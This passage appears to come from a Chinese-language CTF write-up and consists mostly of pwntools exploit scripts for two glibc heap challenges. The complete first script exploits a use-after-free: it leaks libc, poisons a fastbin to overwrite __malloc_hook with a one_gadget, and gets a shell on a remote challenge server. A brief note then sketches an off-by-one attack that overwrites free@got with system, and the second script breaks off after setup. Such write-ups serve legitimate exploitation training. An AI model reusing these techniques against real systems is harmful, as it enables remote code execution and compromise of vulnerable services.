    sla = lambda x, y: p.sendlineafter(x, y)
    elf_path = './uaf_pwn'
    ip = '82.157.5.28'
    port = 52402
    remote_libc_path = './x64/libc.so.6'
    context(os='linux', arch='amd64')
    context.log_level = 'debug'
    def run(local = 1):
        LD_LIBRARY_PATH = './x64/'
        LD = LD_LIBRARY_PATH+'ld.so.6'
        global elf
        global p
        if local == 1:
            elf = ELF(elf_path, checksec = False)
            p = process([LD, elf_path], env={"LD_LIBRARY_PATH": LD_LIBRARY_PATH})
        else:
            p = remote(ip, port)
    def debug(cmdstr=''):
        # context.terminal = ['--with-separate-debug-dir']
        # context.terminal = ['/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powerShell.exe', '-c', 'wt', 'bash', '-c']
        # context.terminal = ['/mnt/c/windows/system32/bash.exe', '-c']
        DEBUG_PATH = './x64/usr/lib/debug/lib/x86_64-linux-gnu/'
        cmd='source /opt/patchelf/loadsym.py\n'
        cmd+='loadsym '+DEBUG_PATH+'libc-2.23.so\n'
        # cmd='set debug-file-directory '+DEBUG_PATH+'\n'
        # cmd=''
        cmd+=cmdstr
        gdb.attach(p, cmd)
        pause()
    def one_gadget(filename = remote_libc_path):
        return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))
    def str2int(s, info = '', offset = 0):
        ret = u64(s.ljust(8, '\x00')) - offset
        success('%s ==> 0x%x'%(info, ret))
        return ret
    def chose(idx):
        sla('>', str(idx))
    def add(size):
        chose(1)
        sla('size>', str(size))
    def edit(idx, content):
        chose(3)
        sla('index>', str(idx))
        sa('', content)
    def free(idx):
        chose(2)
        sla('index>', str(idx))
    def show(idx):
        chose(4)
        sla('index>', str(idx))
    run(0)
    add(0x100)
    add(0x68)
    add(0x68)
    free(0)
    show(0)
    libc = ELF(remote_libc_path)
    libc.address = str2int(p.recv(6).ljust(8, '\0'), 'libc', libc.sym['__malloc_hook']+0x68)
    attack = libc.sym['__malloc_hook']-0x23
    free(1)
    edit(1, p64(attack))
    add(0x68)
    add(0x68)
    one = libc.address + one_gadget()[1]
    payload = 'a'*0x3+p64(one)*4
    edit(4, payload)
    add(0x100)
    # debug()
    p.interactive()
###  null
add溢出一个字节，可以改size大包小，main_arena泄露libc，fastbin
attack打heaplist为free[@got](https://github.com/got
"@got")，改free[@got](https://github.com/got "@got")为system，getshell
    #coding:utf-8
    from pwn import *
    import subprocess, sys, os
    sa = lambda x, y: p.sendafter(x, y)
    sla = lambda x, y: p.sendlineafter(x, y)
    elf_path = './null_pwn'
    ip = '82.157.5.28'
    port = 51904
    remote_libc_path = './x64/libc.so.6'
    context(os='linux', arch='amd64')
    context.log_level = 'debug'
    def run(local = 1):
        global elf
        global p
        if local == 1:
            elf = ELF(elf_path, checksec = False)
            p = elf.process()
        else:
            p = remote(ip, port)
    def debug(cmd=''):
        # context.terminal = []
        gdb.attach(p,cmd)
        pause()
    def one_gadget(filename = remote_libc_path):
        return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))
    def str2int(s, info = '', offset = 0):
        ret = u64(s.ljust(8, '\x00')) - offset
        success('%s ==> 0x%x'%(info, ret))
        return ret
    def chose(idx):
        sla('Your choice :', str(idx))
    def add(idx, size, content = '\n'):
        chose(1)
        sla('Index', str(idx))
        sla('Size', str(size))
        sa('Content', content)
    def edit(idx, content):
        chose(3)
        sla('Index', str(idx))
        sa('Content', content)
    def free(idx):
        chose(2)
        sla('Index:', str(idx))
    def show(idx):
        chose(4)
        sla('Index', str(idx))
    run(0)
    add(0, 0x18)
    add(1, 0x28)